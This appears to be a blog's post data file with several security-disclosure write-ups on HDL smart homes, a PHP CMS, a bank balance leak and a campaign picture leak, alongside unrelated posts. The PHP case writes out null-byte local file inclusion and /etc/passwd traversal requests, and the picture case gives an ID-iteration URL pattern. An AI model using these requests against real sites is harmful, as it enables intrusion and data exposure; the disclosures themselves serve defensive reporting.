<h4>Security precaution #1</h4>If you have an IP gateway connected to your ethernet you want to make that a network that isn't reachable for unauthorized parties - meaning that both wired and wireless network shouldn't be available for anyone you don't trust. My neighbour was over the other day and casually asked "What's the password for the Wi-Fi?" Of course, I run the guest Wi-Fi in my house on a separate network so I could give him access. However, I suspect that most people (or businesses) with HDL don't realize the dangers and let anyone access the same network. If you want your IP gateway to be available via your Wi-Fi you want to make sure that the encryption, password and security in general is at a high level.

<h4>Security precaution #2</h4>Very much like the precaution #1 regarding Wi-Fi and cabled ethernet, you should think twice if you have your ethernet available over your powerlines. What about that power outlet you have outside your house or just inside the garage?

<h4>Security precaution #3</h4>With so many "trusted" devices connected to your Wi-Fi chances are that the security in or more of them have been comprimised. A typical home Wi-Fi for a family have several phones, tablets, laptops, TVs, and a video game console connected. Also with Internet of Things on the rise more and more units are allowed on your local network. If only one of those are compromised, someone could theoretically get access to your smart home. Considering precaution #1-3 you probably shouldn't have the IP gateway connected to the ethernet at all.

<h4>Security precaution #4</h4>Do you have any outdoor sensors for e.g. temperature or motion connected to your system? Well, I don't think you should. What happens if someone hooks up an IP gateway and a computer on that unit or the unit's wires? Correct, they have full access to your system.

<h4>Security precaution #5</h4>Being on a ethernet with a HDL system and recent version of the IP gateway's firmware lets you enable remote access. So, have you possibly had any unwelcome guests connected to your local network at some point? Have you checked if someone has enabled remote access to your system? Or maybe they just fetched the IP address, username and password from the IP gateway. Either way someone could access your system from remote at any desired time later on. My advice is to have the remote connection disabled.

<h4>Security precaution #6</h4>If you have ever accessed your HDL system from remote through the IP gateway you should consider changing the login info and/or disable the remote access. As mentioned, HDL doesn't have any encryption, meaning that nearly anyone could possibly have picked up your login info when connecting through the Internet.

<h4>Security precaution #7</h4>HDL has an SMS gateway that lets you text commands to the HDL system. Typically a set of phone numbers are whitelisted for sending commands. Commands can be something like "VACATION", "ALARM OFF", "OPEN GARAGE". It is very easy to spoof a phone number when sending a text. If someone knows - or guesses - the phone number you send commands from, so can they. If someone has/had access to the SMS gateway that someone could know the commands and even set up other commands.

<h4>Hacking scenario #1</h4>So, what's the problem with having anyone connected to your HDL system either remotely or locally? Well, what if someone reads the status of the motion sensors? Then it could be possible to know if there's anybody home, maybe they could even make educated guesses about who's home depending on which areas that are in use. You don't post a sign outside your home telling potenial burglars that you aren't home, so you shouldn't let your smart home do that either.

<h4>Hacking scenario #2</h4>Okay, somebody knows that noone's home, but you're protected by your smart home aren't you? Motion detectors, alarm sound, blinking lights, SMS warnings on intrusion. If someone has access to your HDL system they can easily turn this off. They could even turn it off, break in, turn the alarm system back on after leaving, and you wouldn't have a clue what happened.

<h4>Hacking scenario #3</h4>If you have smoke detectors connected to the system any communication with the HDL system can be disabled.

<h4>Hacking scenario #4</h4>Got your garage door connected to the system? Or even your front door? Well, you've probably figured it out by now. The doors can be opened (after disabling any alarms).

<h4>Hacking scenario #5</h4>Someone could connect to your system and do vandalism like turning the heat on for full or control the blinds. Some things might be considered just a prank, but what if someone pushes the dimmers, relays and heating to the edge by either turning them on and off quickly or turning them to a 100%? Would it do damage to the components? Cause a fire?

<h4>Hacking scenario #6</h4>Those previous five scenarios were the ones on top of my head. I'm sure you can think of a sixth and endless more yourself.

<h4>Conclusion</h4>This isn't some zero-day vulnerability disclosure of HDL-BUS pro. The system is working as intended. These are just my observations, worries and security tips when dealing with HDL. Make your local network secure, consider not having an IP gateway connected, make sure wires and components aren't accessible for anyone who shouldn't have access. <b>I wish they taught this on the HDL training.</b>

For the ones of you trusting on your local network security I want to quote a great book I'm reading now - <a href="http://shop.oreilly.com/product/0636920033547.do">Abusing the Internet of Things" by Nitesh Dhanjani</a>: <i>"As we add additional IoT devices to our homes, the reliance on WiFi security becomes a hard sell. Given the impact to our physical privacy and safety, it's difficult to stand by the argument that all bets are off once a single device (computer or IoT device) is compromised. Homes in developed countries are bound to have dozens of remotely controllable IoT devices. The single point of failure can't be the WiFi password. What's more, a compromised computer or device will already have access to the network, so a remote attacker does not need the WiFi password."</i>
`,
                "links": [
                    {
                        "title": "Background: Purpose of these posts",
                        "url": "/2017/08/security-vulnerability-disclosures"
                    }
                ],
                "category":
                {
                    "title": "Smart home",
                    "url": "/smart-home"
                },
                "tags": [
                    {
                        "title": "HDL Buspro",
                        "url": "/hdl-buspro"
                    }
                ]
            },
            {
                "title": `Case #4: Blast from the past`,
                "published": true,
                "publishDate": "2017-09-04T05:25:00.000Z",
                "summary": `In 2017 you don't see that many sites running PHP, but recently I stumbled on this site of classical PHP vulnerabilities.`,
                "niceUrl": "/2017/09/php-hack",
                "text": `<h4>tl;dr</h4>A small Norwegian company is using a completely broken and open amateur PHP CMS. The site is open for (at least) local file inclusion and it's possible to completely take over the CMS.
                
<h4>Summary</h4><table class="summary">
<tr>
    <td style="width:30%">Who:</td>
    <td>Anonymous, let's call them <a href="https://en.wikipedia.org/wiki/Fictional_company">Acme2</a></td>
</tr>
<tr>
    <td style="width:30%">Severity level:</td>
    <td><span class="red-text">Critical</span></td>
</tr>
<tr>
    <td style="width:30%">Reported:</td>
    <td>August 2017</td>
</tr>
<tr>
    <td style="width:30%">Reception and handling:</td>
    <td><span class="red-text">Poor</span></td>
</tr>
<tr>
    <td style="width:30%">Status:</td>
    <td><span class="red-text">Not fixed</span></td>
</tr>
<tr>
    <td style="width:30%">Reward:</td>
    <td>Not even a thank you</td>
</tr>
<tr>
    <td style="width:30%">Issue:</td>
    <td>Completely broken PHP web site</td>
</tr>
</table>
<div style="padding-top:80px;" class="col s12 m5 l5 xl4 right"><div class="card-panel light-blue darken-1"><span style="text-decoration:underline;" class="white-text"><a class="white-text" href="/2017/08/security-vulnerability-disclosures">Background: The purpose of these posts</a></span></div></div><h4>Background</h4>I actually can't remember why I landed on the web site. Someone asked me to read something on this or a linking web site. Having seen a lot of bad sites over the years you can sometimes tell just from looking at the front page that you'll find some issues there.

The site is for a very small Norwegian company doing some kind of training programs for other companies. It has some public facing login for editing the content inline and is written in the server-side scripting language <a href="https://en.wikipedia.org/wiki/PHP">PHP</a>. <a href="https://trends.google.com/trends/explore?date=all&q=%2Fm%2F060kv">There was a time when PHP was very popular</a>, but I guess those days over.

<h4>Approach (technical stuff)</h4>Once in a while I take a quick peek at web sites' source code. I was expecting to find something on this particular one, but I didn't expect to find it that quickly:
<pre class="prettyprint">
&lt;!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"&gt;
&lt;html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en"&gt;
&lt;head&gt;
&lt;title>[name of company]&lt;/title&gt;
...
&lt;link rel="stylesheet" type="text/css"
    href="merge.php?css[]=%2Fcss%2Fstandard.css&amp;css[]=%2Fcss%2Fcustom.css" /&gt;
...
&lt;/head&gt;
...
&lt;/html&gt;
</pre>
Can you spot the opening? <b>Obviously the CSS was produced by some PHP script combining separate CSS files into one. Could it be that it would work for other files and directories?</b>

Well, first I had to find the name of some other PHP files. I didn't see any, so I logically guessed on <span class="code">index.php</span>: <pre class="prettyprint">http://example.com/merge.php?css[]=index.php</pre>
But then it responed something like <pre class="prettyprint lang-php">/* File is not a CSS or JavaScript file. */</pre>
Good, maybe there was some sort of security in place after all?

As you might know, PHP is built mainly using the programming language C. And C uses <a href="https://en.wikipedia.org/wiki/Null_character">null bytes</a> to terminate strings. So the next natural step is to try a URL like <pre class="prettyprint">http://example.com/merge.php?css[]=index.php%00.css</pre> where the script will still check for the <span class="code">.css</span> file ending, but when using the input string to include a underlying file it'll only use the part up to the null byte (URL encoded as <span class="code">%00</span>).

<b>This was bulls eye. I got the source of the <span class="code">index.php</span> file back. At this point you know that you are golden.</b>

Normally I would just provide a URL like <pre class="prettyprint">http://example.com/merge.php?css[]=../../../../../etc/passwd%00.css</pre> just to prove the point to the site owner. Not that <span class="code"><a href="https://en.wikipedia.org/wiki/Passwd">/etc/passwd</a></span> contains any passwords any longer, but it will typically reveal usernames and shows that one can retrieve almost any file from the file system. However, this was a Windows machine and the <span class="code">index.php</span> was not containing anything fun in itself.

<span class="code">index.php</span> did however point me towards other scripts files and moments later <b>I got hold of this PHP file that actually defined the username and <a href="https://en.wikipedia.org/wiki/Cryptographic_hash_function">hashed</a> version of the password of the admin user.</b> Given the state of the site I'd be surprised if there even was some random <a href="https://en.wikipedia.org/wiki/Salt_(cryptography)">salt</a> per user. So what you do you do when you have a hash? Well, you search for a online <a href="https://en.wikipedia.org/wiki/Rainbow_table">rainbow table</a> site.

<b>I got an immediate hit for the hash.</b> Not surprisingly the hash function used was the no longer recommended <a href="https://en.wikipedia.org/wiki/SHA-1">SHA-1</a> and the password itself was so short and simple that you probably won't find it on <a href="https://en.wikipedia.org/wiki/List_of_the_most_common_passwords">lists of the most common passwords</a>. Using the username and password you'd get full access to the content management system for the site.

At this point I stopped looking any further. I had enough info to report the issue and give a sense of the severity of what I saw.

<h5>What I overlooked</h5>In my eagerness to find the security holes in the web app (and due to lacking branding) I didn't notice that this was actually not a homemade PHP site like I first thought. I didn't see it until writing this post, but there was a very interesting HTML meta tag: <pre class="prettyprint">&lt;meta name="generator" content="gpEasy CMS" /&gt;</pre>
While I couldn't easily find the full history, it seems like gpEasy CMS is an old version of <a href="http://www.typesettercms.com/">Typesetter CMS</a>. I couldn't find the file inclusion among <a href="https://www.cvedetails.com/product/19479/Gpeasy-Gpeasy-Cms.html?vendor_id=10881">the issues on CVE details</a>, though there was <a href="https://packetstormsecurity.com/search/?q=gpeasy">another site with quite a few issues listed</a>.

<h4>Security issue</h4>This is a completely broken PHP CMS. It's possible to retrieve about any file on the server, and you can change any contents of the site.

This is only speculation as I didn't look further after finding the file inclusion issue, but when you find a site like this you most probably also will find other types of holes like remote code injection.

<h4>Reception and handling</h4><h5>Day zero</h5>I sent an e-mail to the contact address. <b>8 minutes later I got a response. That's a new record.</b> But the answer wasn't that uplifting. Apparently the site hadn't been of much in use the last years (though I would definitely guessed otherwise looking at the public accounting and taxation figures..). It didn't seem to be of any interest doing anything with the site or server. So hopefully there isn't anything of value there and hopefully no one makes the server into some kind of <a href="https://en.wikipedia.org/wiki/Zombie_(computer_science)">zombie</a>.

<h4>Anonymous you say?</h4>This is a small company, possibly not in any real operation. They haven't fixed - and probably won't fix - the issue. I don't think it's right naming them. Let's just hope no one else finds the site and that they don't have any important or customer data on the server.

<h4>Conclusion</h4>This was a blast from the past for me. It's been quite some time since I last saw an amateur PHP site like this. PHP once was very hot as the scripting language, partly because it is very easy to get started with, but it had a lot of pitfalls and it was so easy to make a site insecure. As the language matured the usage has gone down. Today most issues I see are HTTP service endpoints with lacking authorization checks.
`,
                "links": [
                    {
                        "title": "Background: Purpose of these posts",
                        "url": "/2017/08/security-vulnerability-disclosures"
                    }
                ],
                "category":
                {
                    "title": "Security",
                    "url": "/security"
                },
                "tags": [
                    {
                        "title": "Security Monday",
                        "url": "/security-monday"
                    },
                    {
                        "title": "PHP",
                        "url": "/php"
                    },
                    {
                        "title": "File inclusion",
                        "url": "/file-inclusion"
                    },
                    {
                        "title": "OWASP 2013 A1",
                        "url": "/owasp-2013-a1"
                    }
                ]
            },
            {
                "title": "Building an almost real SPA blog",
                "published": true,
                "publishDate": "2017-09-07T14:50:00.000Z",
                "summary": "I thought I could have this blog as a real single-page application with no server code. That sort of worked. If it only hadn't been for the previews.",
                "niceUrl": "/2017/09/an-almost-real-spa-blog",
                "text": `<h4>tl;dr</h4>My first post on this blog was <a href="/2017/08/building-a-real-spa-blog">Building almost a real SPA blog</a>. While the title mostly is still true, I ended up having a bit more <span class="code">.htaccess</span> config and a small Python script for previews of posts in social media and add support for web feed.
                
<h4>Single-page application</h4>I was able to build this blog as a <a href="https://en.wikipedia.org/wiki/Single-page_application">single-page application</a>. I had - and still have - all contents in <a href="https://github.com/roys/js-web-blog/blob/master/contents.js">one single static JavaScript array</a> and use the JavaScript framework <i>Knockout</i> and the front-end framework <i>Materialize</i>. So far so good.
                
<h4>Search engine optimization</h4>Google has since 2014 been able to <a href="https://webmasters.googleblog.com/2015/10/deprecating-our-ajax-crawling-scheme.html">render and understand JavaScript web applications</a>. <b>Using the Search Console's <a href="https://www.google.com/webmasters/tools/googlebot-fetch">Fetch as Google</a> I have been able to verify that Google understands my site just perfect.</b> Doing a <a href="https://www.google.no/search?q=site:blog.roysolberg.com">site: search</a> also confirms that.

I have to admit that I don't care too much about other search engines like Bing, Yahoo, etc. Google is in its own class when it comes to searching. However, because of the mentioned Python script I now have a tool for that as well. More about that in a second.

<h4>Article preview</h4><img style="width:450px;float:left;margin-right:20px;" class="materialboxed responsive-img" title="Typical article preview using Open Graph Protocol tags." data-caption="Typical article preview using Open Graph Protocol tags." src="/images/linkedin_preview.png"/>I sometimes post my articles to <a href="https://twitter.com/roysolberg">Twitter</a>, Facebook and <a href="https://www.linkedin.com/in/roysolberg/">LinkedIn</a>. <b>When creating a preview of the links those sites certainly does not try to parse any of the contents as a modern browser. They just look for <a href="https://dev.twitter.com/cards/overview">Twitter Cards</a> or <a href="http://ogp.me/">Open Graph Protocol</a> (OGP) meta tags.</b> If they don't find anything they typically default to the <span class="code">&lt;title/&gt;</span> tag.

My <span class="code">index.html</span> only has a standard <span class="code">&lt;title/&gt;</span> tag which makes no sense in the context of my articles. That makes the previews pretty bad, so I mostly skipped them in the start. However, I think the content is so much better with a good preview of the contents. I'm sure it also makes more people click the links.

<h4>Web feed</h4>Naturally one doesn't get any web feed like <a href="https://en.wikipedia.org/wiki/Atom_(standard)">Atom</a> or <a href="https://en.wikipedia.org/wiki/RSS">RSS</a> out of the box when building a single-page application. And that's also one of the things I wanted to have for my site.

So far I've added support for Atom which you can acess at <a href="https://blog.roysolberg.com/atom">https://blog.roysolberg.com/atom</a>.

<h4>The easy way out</h4>I couldn't find a way to solve the preview challenge without resorting to some backend code. I really like <a href="https://en.wikipedia.org/wiki/Python_(programming_language)">the programming language Python</a>. Writing just a few lines of code I was able to create a script that read the contents in the JavaScript array and produced the necessary OGP tags. You can <a href="https://github.com/roys/js-web-blog/blob/master/preview.cgi">see the source code of the script on GitHub</a>.

Now that I had the script for generating the preview I needed a way to route the bots to it. For that I used the already existing <span class="code">.htaccess</span> configuration file and look for the <a href="https://en.wikipedia.org/wiki/User_agent">User-Agent header</a> belonging to the different sites' bots. You can <a href="https://github.com/roys/js-web-blog/blob/master/.htaccess">see the source code for .htaccess on GitHub</a>.

Because of the preview setup I got support for other non-Google search engines for free. They access the same code as generated by the Python script. Google is still served the same site as you are.

Having the preview script it didn't take long to make support for the Atom feed. You can <a href="https://github.com/roys/js-web-blog/blob/master/atom.cgi">see the source code of the script on GitHub</a>.

<h4>Wishes for the future</h4><b>I don't think the Open Graph Protocol is very flexible or ready for single-page applications and thicker clients.</b>

<b>The first thing that hit me when creating the script was that I couldn't just inject the meta data as HTTP headers.</b> I had to create HTML markup for it. I can't understand why one shouldn't be able to choose between headers and tags.

Secondly the different social media sites need to start doing what Google has been doing since 2014; render the pages with some kind of <a href="https://en.wikipedia.org/wiki/Headless_browser">headless browser</a> to be able to understand the contents and get dynamically injected OGP meta tags. It's not that much magic or resource demanding in 2017.

<h4>GitHub project</h4>If you're interested you can have a look at the source code for this blog at <a href="https://github.com/roys/js-web-blog">https://github.com/roys/js-web-blog</a>. The project itself is licenced under the MIT License, but for the contents (posts and images) I reserve all rights.
`,
                "images": ["/images/linkedin_preview.png"],
                "category":
                {
                    "title": "Software development",
                    "url": "/software-development"
                },
                "tags": [
                    {
                        "title": "JavaScript",
                        "url": "/javascript"
                    },
                    {
                        "title": "SPA",
                        "url": "/spa"
                    }
                ]
            },
            {
                "title": "Case #5: Tell me your bank account no. and I'll tell you how rich you are",
                "published": true,
                "publishDate": "2017-09-11T05:00:00.000Z",
                "summary": "I'm sure you expect your bank accounts to be safe from prying eyes. For a while other customers knowing my bank account number could check my account balance.",
                "niceUrl": "/2017/09/skandiabanken-leak",
                "text": `<h4>tl;dr</h4>The Norwegian bank Skandiabanken leaked the balance of other customers' bank accounts. I also question parts of their session handling.
                
<h4>Summary</h4><table class="summary">
<tr>
    <td style="width:30%">Who:</td>
    <td><a href="https://skandiabanken.no">Skandiabanken</a></td>
</tr>
<tr>
    <td style="width:30%">Severity level:</td>
    <td><span class="red-text">High</span></td>
</tr>
<tr>
    <td style="width:30%">Reported:</td>
    <td>September 2017</td>
</tr>
<tr>
    <td style="width:30%">Reception and handling:</td>
    <td><span class="green-text">Very good</span></td>
</tr>
<tr>
    <td style="width:30%">Status:</td>
    <td><span class="green-text">Fixed</span></td>
</tr>
<tr>
    <td style="width:30%">Reward:</td>
    <td>A big thank you</td>
</tr>
<tr>
    <td style="width:30%">Issue:</td>
    <td>Information leak with other customers' bank account balances and account names</td>
</tr>
</table>
<div style="padding-top:80px;" class="col s12 m5 l5 xl4 right"><div class="card-panel light-blue darken-1"><span style="text-decoration:underline;" class="white-text"><a class="white-text" href="/2017/08/security-vulnerability-disclosures">Background: The purpose of these posts</a></span></div></div>
<h4>Background</h4>Skandiabanken - soon to be called Sbanken - is a fairly large bank in Norway with its more than 400,000 customers. It was Norway's first pure online bank when it started in 2000. I have been a customer since that first time and all along from the start it's been my favourite bank.

This summer a regulation for personal savings accounts for shares was approved. From September 1st 2017 it was possible to move shares and funds into this new type of account. The timing meant that all banks in Norway suddenly were in a hurry for getting the product ready.

The morning of the opening of the new account type I was logged in to create one for myself. I noticed that there was a few missing text translations and some places where it said <i>undefined</i> in the user interface. This new part of the bank wasn't all bug free yet.

<h4>Approach (technical stuff)</h4><img style="width:500px;float:left;margin-right:20px;" class="materialboxed responsive-img" title="Screenshot from Vivaldi containing JSON with back account details." data-caption="Screenshot from Vivaldi containing JSON with back account details." src="/images/skandiabanken_accountdetails.png"/>I opened <a href="https://help.vivaldi.com/article/developer-tools/">Vivaldi developer tools</a> when logged in, to see what was going on in regards of network calls. I was surprised to see that one of the presumably new <a href="https://en.wikipedia.org/wiki/Ajax_(programming)">Ajax</a> calls contained one of my bank account numbers. I could be wrong, but I think it's atypical for them to use that ID when asking for data from the backend. That of course doesn't mean anything, but I got curious and wondered if my data was properly secured.

The Ajax call returned <a href="https://en.wikipedia.org/wiki/JSON">JSON</a> with the balance and some other data about the bank account in question. <b>I asked a friend for a bank account number and permission to check if I could get any of his data returned. And indeed I got his data.</b>

<h4>Security issue</h4><b>Knowing just the bank account number of another customer one would get these data:</b>
- Some UUID of the bank account
- Customer's own name of the account
- <b>The account's bank balance</b>
- <b>The account's book balance</b>

<h4>Reception and handling</h4><h5>Day zero</h5>I notified the bank and they immediately responded and started checking out the issue.

<b>Just hours later they had rolled out a fix for the problem.</b> This must be the quickest fix I have ever seen for a security issue.

Later the same I day I was phoned up by one of the chiefs who thanked me and told me they were grateful for that I found and reported the issue.

<h5>Day 4 - incorrectly reporting a second issue...</h5>I had left my browser logged into this new part of the bank called "Min sparing" ("My savings"). When I returned to the computer quite a bit later I noticed that I was still logged in. And I noticed that I could close and open my browser and still be logged in to this part of the bank. Going to other parts of the bank would log me out from everything.

I reported this by e-mail, but just after that I learned that <a href="https://skandiabanken.no/sporsmal-og-svar/min-sparing/hvor-lenge-kan-jeg-vare-inaktiv-i-min-sparing-appen-for-jeg-blir-logget-ut/">this part of the bank has 9 hours session time</a> and not 20 minutes as most parts of the bank. I felt a bit embarrassed for reporting a non-issue and wasting their time.

<h5>Day 5 - ...or was I into something?</h5>The next morning I realized something. Though this "My savings" session time was intentionally high, Skandiabanken offers simultaneous logins, and logging out from one session doesn't invalidate any others. <b>This means that if you are able to get access to a computer where the user forgot to log out after accessing "My savings" in the last hours you can get hold of the cookies and keep the session alive by only calling the server once in a while.</b>

<b>What's more is that you can do this call from any location. You don't have to use the same computer or IP address.</b> The "My savings" page gives a pretty good glance into your economy (like shares, funds and some transactions), and using the mentioned Ajax call you <s>can</s> could also use the same cookie to access the balance of other known account numbers for that logged in user. <b>Hopefully the session can't be kept alive forever without signing in again.</b> While testing I had this one session alive for more than 36 hours (while changing locations and having other devices logged in and out).

<b>Skandiabanken replied and told me that this session handling is a feature and not a bug.</b> They want a long session time, and they don't want to restrict the session to IP addresses because of mobile clients.

<h5>Day 5 - new webapp deployed</h5>Skandiabanken seems to have removed the bank account number from the Ajax call, making it always return the balance of the payment account for funds and making the "My savings" page only getting savings related data. I would say that's a step in right direction. The 9 hours session time seems to stay the same.

<h4>Conclusion</h4><b>As far as I know the security hole with balance access was introduced that morning and was only in the wild less than a day.</b> I have worked with online banking as an IT consultant and know how seriously security is taken in that industry. I was pleased - but not surprised - to see how seriously and professionally Skandiabanken handled everything.

I feel confident that this issue would've been discovered relatively quickly by the bank itself hadn't I reported it. However, for me online banking is one of those services that just need to always be secure and never leak information like this.

<b>What makes me a bit uneasy is the session handling feature/issue where someone could be watching my economy with a logged in session that I'm unaware of.</b>

<b>Please remember to always hit that <i>Log out</i> button.</b>
`,
                "images": ["/images/skandiabanken_accountdetails.png"],
                "links": [
                    {
                        "title": "Background: Purpose of these posts",
                        "url": "/2017/08/security-vulnerability-disclosures"
                    }
                ],
                "category":
                {
                    "title": "Security",
                    "url": "/security"
                },
                "tags": [
                    {
                        "title": "Security Monday",
                        "url": "/security-monday"
                    },
                    {
                        "title": "Information leak",
                        "url": "/information-leak"
                    },
                    {
                        "title": "Authorization",
                        "url": "/authorization"
                    },
                    {
                        "title": "Bank account",
                        "url": "/bank-account"
                    },
                    {
                        "title": "OWASP 2013 A7",
                        "url": "/owasp-2013-a7"
                    }
                ],
                "commentsIdentifier": "https://blog.roysolberg.com/2017/09/skandiabanken-leak"
            },
            {
                "title": "1995: When you could get a demo of the Internet on a floppy disk",
                "published": true,
                "publishDate": "2017-09-13T21:00:00.000Z",
                "updateDate": "2017-09-16T06:10:00.000Z",
                "summary": "This one is for you who actually know what that save icon in Word is.",
                "niceUrl": "/2017/09/internet-demo",
                "text": `<h4>tl;dr</h4>I've uploaded all the HTML files from a Norwegian Internet Service Provider's Internet demo diskette so you can (almost) surf like it's 1995.

<h4>Background</h4><img style="float:left;width:400px;margin-right:20px;" class="materialboxed responsive-img" title="The diskette containing the browser and demo pages." data-caption="The diskette containing the browser and demo pages." src="/images/floppy02.jpg">
Back in 1995 - one year before I tried the Internet for the first time, and two years before I got Internet access at home - my mother brought me this floppy disk from work. She thought I might be interested in checking it out. <b>It was a demo of the Internet!</b>

I didn't really know what the <a href="https://en.wikipedia.org/wiki/World_Wide_Web">World Wide Web</a> was about. The diskette contained the web browser <a href="https://en.wikipedia.org/wiki/Mosaic_(web_browser)">Mosaic</a>, and it actually gave a feel of what the Internet was like.

<h4>Demo</h4>Below is the demo itself. It's nice to see the HTML pages still working the same 22 years later. You can also <a href="https://blog.roysolberg.com/stuff/sol/initial.htm">open demo in full screen</a>.
<input type="button" value=" < " onclick="window.parent.frames[1].history.back()"/> <input type="button" value=" > " onclick="window.parent.frames[1].history.forward()"/>
<iframe style="margin: none;padding: none;border:1px solid #000;line-height: 0;" src="https://blog.roysolberg.com/stuff/sol/initial.htm" width="600" height="600" />

<h4>First lines of HTML</h4>When I tried the demo disk I remember being curious about how those pages worked. I found the source code and from there I wrote my first lines of HTML. It was pretty cool to see how the markup was rendered in the browser from the floppy disk. Little did I know I would code web pages for a living 10 years later. :)

<h4>References</h4>- <a href="https://www.nrk.no/trondelag/hun-lanserte-internett-i-norge-1.11078996">– Folk syntes internett var for raringer</a>
- <a href="http://www.oslo.net/historie/CW/utg/9510/cw951033.html">"Scandinavia online" på lufta</a>
`,
                "images": ["/images/floppy01.jpg", "/images/floppy02.jpg"],
                "category":
                {
                    "title": "Internet archive",
                    "url": "/internet-archive"
                },
                "tags": [
                    {
                        "title": "1990s",
                        "url": "/security-monday"
                    }
                ]
            },
            {
                "title": "Case #6: Who's looking at your pictures?",
                "published": true,
                "publishDate": "2017-09-18T05:25:00.000Z",
                "summary": "A campaign where you can upload your pictures is making a small version of them publicly available at a \"impossible to guess\" URL. It was possible to systematically retrieve all the images.",
                "niceUrl": "/2017/09/picture-leak",
                "text": `<h4>tl;dr</h4>A campaign web site from Norway's leading supplier of branded goods, where one could upload images - typically of your kid, and typically including their first name and year of birth - was, and still is, making a small 90 x 90 pixels image publicly available. It was possible to systematically retrieve the data.
                
<h4>Summary</h4><table class="summary">
<tr>
    <td style="width:30%">Who:</td>
    <td><a href="http://www.orklafoods.no/">Orkla Food</a>'s <a href="http://kampanje.stabburetleverpostei.no">campaign</a> by <a href="https://www.japanphoto.no/">Japan Photo</a></td>
</tr>
<tr>
    <td style="width:30%">Severity level:</td>
    <td><span class="green-text">Low</span></td>
</tr>
<tr>
    <td style="width:30%">Reported:</td>
    <td>August 2017</td>
</tr>
<tr>
    <td style="width:30%">Reception and handling:</td>
    <td><span class="green-text">Good</span></td>
</tr>
<tr>
    <td style="width:30%">Status:</td>
    <td><span class="orange-text">Partially fixed</span></td>
</tr>
<tr>
    <td style="width:30%">Reward:</td>
    <td>A thank you</td>
</tr>
<tr>
    <td style="width:30%">Issue:</td>
    <td>A small version of the uploaded picture and often the given name and year of birth of the person in the picture is available publicly available</td>
</tr>
</table>
<div style="padding-top:80px;" class="col s12 m5 l5 xl4 right"><div class="card-panel light-blue darken-1"><span style="text-decoration:underline;" class="white-text"><a class="white-text" href="/2017/08/security-vulnerability-disclosures">Background: The purpose of these posts</a></span></div></div><h4>Background</h4><img style="width:300px;float:left;margin-right:20px;" title="Example of the image type that is publicly available." src="/images/leverpostei02.jpg"/><i>Stabburet Leverpostei</i> is a kind of <a href="https://en.wikipedia.org/wiki/Liver_pâté">liver pâté</a> that has been part of the diet for many Norwegians for generations. They have had a pretty iconic can with a picture of a kid on the front. At first they had the same kid from 1955 to 1970, but in more recent times they have been using the front as more of a marketing opportunity with competitions, campaigns and more a frequent change and use of several different faces.

In August 2017 I saw a TV commercial telling that <b>if you bought 3 cans of Stabburet Leverpostei you could upload your own picture and receive your own cover that you can use at home.</b>

Of course this made me wonder if the images were securly stored.

<h4>Approach (technical stuff)</h4><img style="width:439px;float:left;margin-right:20px;" class="materialboxed responsive-img" title="Image created by the campaign website." data-caption="Image created by the campaign website." src="/images/leverpostei01.png"/>I went through the wizard for uploading images, getting the lid and buying other products at the same time as having <a href="https://developers.google.com/web/tools/chrome-devtools/">Chrome DevTools</a> open. I looked for anything out of the ordinary and of course tried out different URLs with different IDs and input.

What I saw was that every image uploaded got a <a href="https://en.wikipedia.org/wiki/Universally_unique_identifier">UUID</a> which was used when refering to the image in the different web pages.

They also had this share function where you share the lid that you had created to different social media. What this did was just refer to this UUID at some URL.

The sensible thing would be to make the image publicly available at some URL the moment the customer chose to share the image. As long as it is public, one should expect the image to be accessible to anyone knowing or guessing the URL.

<b>The first problem was - and still is - that all images - shared or not - are publicly available if you just know the URL. For me this looks like quite a trend. Developers often assume that because a URL is hard to guess it should be considered private.</b> This spring we had some media coverage in Norway on how <a href="https://www.digi.no/artikler/16-mai-ble-det-full-kriseberedskap-i-evry-etter-datalekkasje-rotarsaken-kan-pavirke-alle-norske-selskaper/383149">a change in the browser Microsoft Edge made Bing index a lot of URLs like these</a> (Norwegian text). Yes, the URLs might be hard to guess, but the problem is that the URL will always be valid, it will always be public, and you don't know who's accessing it.

Going through the checkout process I noticed that the URL for the final receipt - <a href="http://www.stabburetleverpostei.no/takk-for-din-lokkbestilling/">http://www.stabburetleverpostei.no/takk-for-din-lokkbestilling/</a> - included the mentioned UUID. And, what's more, <b>the URL redirecting to that URL had the format <span class="code">http://kampanje.stabburetleverpostei.no/checkout/finished/&lt;some auto incremental ID&gt;</span>. Iterating the ID made it possible to collect the UUIDs from seemingly all the orders (I only tried a few).</b>

E.g., going to
<a style="font-size:smaller;" class="code" href="http://kampanje.stabburetleverpostei.no/checkout/finished/2095270">http://kampanje.stabburetleverpostei.no/checkout/finished/<b>2095270</b></a>
would redirect to 
<a style="font-size:smaller;" class="code" href="http://www.stabburetleverpostei.no/takk-for-din-lokkbestilling/?lokkid=0498600376a123f1530f1fed7083b350">/takk-for-din-lokkbestilling/?lokkid=<b>0498600376a123f1530f1fed7083b350</b></a>
which meant that the image could be seen at
<a style="font-size:smaller;" class="code" href="http://kampanje.stabburetleverpostei.no/bestill/streamthumb/0498600376a123f1530f1fed7083b350">/bestill/streamthumb/<b>0498600376a123f1530f1fed7083b350</b></a>.

<h4>Security issues</h4>I found two issues in the campaign web site. One is now fixed, but the other persists:
- <b>Fixed: One could iterate through the completed orders and get the URL of all images</b>
- <b>Not fixed: Seemingly all images from the orders - even the ones not completed - are public (often including given name and year of birth)</b>

The fact that all images are publicly available is not mentioned in the terms of this campaign.

<h4>Reception and handling</h4><h5>Day zero</h5>At night I sent an e-mail to the contact address (for Eurofoto (owned by Japan Photo)) telling them about by my findings.

<h5>Day 1</h5>Just before midnight I received an e-mail telling me that they have stopped adding the image UUID to the URL of the "thank you" page. That's a very impressive response time. It does, however, seem like all images still are publicly available.

<h4>Why the low severity level?</h4>On one hand one could blow this up really big; a lot of pictures of kids with what's probably often their real given name and their year of birth. But, let's be real; in this case we are talking about <b>small</b> images; about 90 x 90 pixels are of the person itself (and then the rest is the rest of the can with the name, year and stuff).

Now, this is <b>speculation</b>, but I wouldn't be surprised if the full size images are available on some other public URL. However, I did not find that. And looking at the image data being uploaded we're looking at a image size (of the person) as small as about 220 x 220 pixels. That is still a pretty low resolution.

Also, there is no connection between the images and data like full name or location.

<h4>Conclusion</h4><b>You - as a consumer - should always assume that whatever kind of images or information that you are uploading or sending to some third party can end up in either the wrong hands or be publicly available.

All you developers: Please don't think that UUIDs makes data private. You still need authentication and authorization; and you still need to check that it's actually working.

